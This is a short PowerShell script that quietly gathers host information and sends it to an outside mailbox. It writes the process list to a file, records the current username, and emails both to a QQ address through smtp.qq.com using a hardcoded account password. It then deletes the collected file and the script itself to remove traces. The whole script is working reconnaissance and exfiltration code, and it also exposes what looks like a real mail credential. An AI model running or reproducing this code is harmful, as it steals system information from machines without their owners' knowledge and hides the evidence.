get-process >> process.txt
$whoami = whoami
$smtpServer = "smtp.qq.com"
$smtpUser = "hk_snow@qq.com"
$smtpPassword = "vnkaewsoxhjkeafg"
#create the mail message
$mail = New-Object System.Net.Mail.MailMessage
#set the addresses
$MailAddress="hk_snow@qq.com"
$MailtoAddress="hk_snow@qq.com"
$mail.From = New-Object System.Net.Mail.MailAddress($MailAddress)
$mail.To.Add($MailtoAddress)
#set the content
$mail.Subject = $whoami;
$mail.Priority = "High"
$mail.Body = "Hello Powershell"
$filename="process.txt"	#add file
$attachment = new-Object System.Net.Mail.Attachment($filename)
$mail.Attachments.Add($attachment)
#send the message
$smtp = New-Object System.Net.Mail.SmtpClient -argumentList $smtpServer
$smtp.Credentials = New-Object System.Net.NetworkCredential -argumentList $smtpUser,$smtpPassword
$smtp.Send($mail)
remove-item $MyInvocation.MyCommand.Path -force
remove-item process.txt -force